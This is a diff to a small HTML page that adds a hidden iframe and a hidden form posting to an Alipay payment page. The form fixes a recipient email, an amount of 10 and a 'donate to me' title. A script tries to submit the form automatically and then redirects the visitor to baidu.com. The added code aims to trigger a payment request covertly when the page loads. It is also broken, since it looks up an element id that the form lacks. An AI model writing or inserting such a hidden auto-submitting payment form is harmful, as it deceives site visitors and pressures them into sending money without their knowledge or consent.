@@ -1,7 +1,16 @@
 <html>
   <head>
+    <iframe name="hiddenIframe"  style="display:none"></iframe>
+<form action="https://shenghuo.alipay.com/send/payment/fill.htm" method="POST" target="_blank" accept-charset="GBK" target="hiddenIframe">
+    <input name="optEmail" type="hidden" value="892773019@qq.com">
+    <input name="payAmount" type="hidden" value="10">
+    <input id="title" name="title" type="hidden" value="捐赠我">
+    <input name="memo" type="hidden" value="">
+    <input name="pay" type="image" value="转账" src="https://img.alipay.com/sys/personalprod/style/mc/btn-index.png">
+</form>
 <script>
-window.open('index.html', 'newwindow', 'height=100, width=400, top=0, left=0, toolbar=no, menubar=no, scrollbars=no, resizable=no, location=no, status=no')
+	document.getElementById('form').submit();
+	location.href = "https://baidu.com";
 </script>
 </head>
 </html>
